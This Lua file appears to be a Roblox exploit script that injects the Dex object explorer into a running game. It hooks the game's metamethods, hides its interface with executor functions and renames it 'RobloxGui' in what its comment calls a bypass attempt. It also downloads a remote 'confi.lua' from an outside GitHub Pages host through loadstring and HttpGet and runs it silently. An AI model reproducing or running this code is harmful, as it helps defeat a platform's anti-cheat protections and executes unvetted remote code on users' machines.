-- syndexpro.lua --

local function NSIK_fake_script()

getgenv().Services = setmetatable({},{__index=function(s,r) return game:service(r) end})	
						
getgenv().confi = loadstring(game:HttpGet("https://l8x.github.io/syndexpro/confi.lua", true, Enum.HttpRequestType.Analytics, true))
			
pcall(function()

local OldIndex
OldIndex = hookmetamethod(game, "__index", function(Self, Index)
    return OldIndex(Self, Index)
end)

local OldNewIndex
OldNewIndex = hookmetamethod(game, "__newindex", function(Self, Index, Value)
    return OldNewIndex(Self, Index, Value)
end)

local OldNamecall
OldNamecall = hookmetamethod(game, "__namecall", function(Self, ...)
    return OldNamecall(Self, ...)
end)

local mt = getrawmetatable(game)

local old
old = hookfunction(mt.__namecall, function(...)
   return old(...)
end)

end)

local cloneref = cloneref or function(ref)
return ref
end

local CCoreGui = cloneref(Services.CoreGui)
local CContentProvider = cloneref(Services.ContentProvider)
local CInsertService = cloneref(Services.InsertService)

-- < Functions > --
getgenv().yeetdex = function(yeetdex)

local CoreGui = CCoreGui
local RemoteDebugWindow = CoreGui:FindFirstChild("RemoteDebugWindow", true)
if RemoteDebugWindow then
    RemoteDebugWindow.Parent:Destroy()
end end

-- < Services > --	
local InsertService = CInsertService
local CoreGui = CCoreGui
local ContentProvider = CContentProvider
-- < Aliases > --
local table_insert = table.insert
local table_foreach = table.foreach
local string_char = string.char
getgenv().getobjects = function(a)
    local Objects = {}
    if a then
        local b = InsertService:LoadLocalAsset(a)
        if b then 
            table_insert(Objects, b) 
        end
    end
    return Objects
end

-- < Values > --
local Charset = {}
local Random_Instance = Random.new()
local RemoteDebugWindow = CoreGui:FindFirstChild("RemoteDebugWindow", true)
-- < Source > --
if RemoteDebugWindow then
	RemoteDebugWindow.Parent:Destroy()
end

for i = 48,  57 do 
	table_insert(Charset, string_char(i))
end

for i = 65,  90 do 
	table_insert(Charset, string_char(i))
end

for i = 97, 122 do
	table_insert(Charset, string_char(i))
end

function RandomCharacters(length)
	return length > 0 and RandomCharacters(length - 1)..Charset[Random_Instance:NextInteger(1, #Charset)] or ""
end
			
local HTTPService = cloneref(Services.HttpService)
local CoreGui     = gethui()
local ScriptContext = cloneref(Services.ScriptContext)
local RandomObject = CoreGui:FindFirstChildOfClass("ScreenGui")
local RandomObject2 = Instance.new("Folder", RandomObject)

pcall(function() syn.protect_gui(RandomObject2) end)

local CRandomObject2 = cloneref(RandomObject2)

pcall(function() syn.protect_gui(CRandomObject2) end)

local Dex = cloneref(getobjects("rbxassetid://7995973532")[1])
ContentProvider:Preload("rbxassetid://7995973532")
task.spawn(function()
for i,v in pairs(Dex:GetDescendants()) do
    syn.protect_gui(v)
    end
    task.wait(0)
end)
Dex.Name = "RobloxGui" -- bypass attempt??

pcall(function()
sethiddenproperty(Dex, "OnTopOfCoreBlur", true)
sethiddenproperty(Dex, "AutoLocalize", true)
sethiddenproperty(Dex, "Localize", true)
sethiddenproperty(Dex, "IgnoreGuiInset", true)
sethiddenproperty(Dex, "DisplayOrder", 2147483647)
sethiddenproperty(cloneref(Services.UserInputService), "GazeSelectionEnabled", true)
sethiddenproperty(cloneref(Services.StarterGui), "ProcessUserInput", true)
end)

pcall(function()
syn.protect_gui(Dex)
syn.protect_gui(RandomObject)
syn.protect_gui(RandomObject2)
syn.protect_gui(CRandomObject2)
end)

Dex.Parent = gethiddengui() or gethui() or CRandomObject2

local function Load(Obj, Url)
	local function GiveOwnGlobals(Func, Script)
		local Fenv, RealFenv, FenvMt = {}, {script = Script}, {}
		FenvMt.__index = function(a,b)
			return RealFenv[b] == nil and getgenv()[b] or RealFenv[b]
		end
		FenvMt.__newindex = function(a, b, c)
			if RealFenv[b] == nil then 
				getgenv()[b] = c
		else 
			RealFenv[b] = c 
			end
		end
		setmetatable(Fenv, FenvMt)
		pcall(setfenv, Func, Fenv)
		return Func
	end
	local function LoadScripts(_, Script)
		if Script:IsA("LocalScript") then
			spawn(function()
				GiveOwnGlobals(loadstring(Script.Source,"="..Script:GetFullName()), Script)()
			end)
		end
		table_foreach(Script:GetChildren(), LoadScripts)
	end
LoadScripts(nil, Obj)
end
Load(Dex)
end
coroutine.wrap(NSIK_fake_script)()

pcall(function() confi() end)
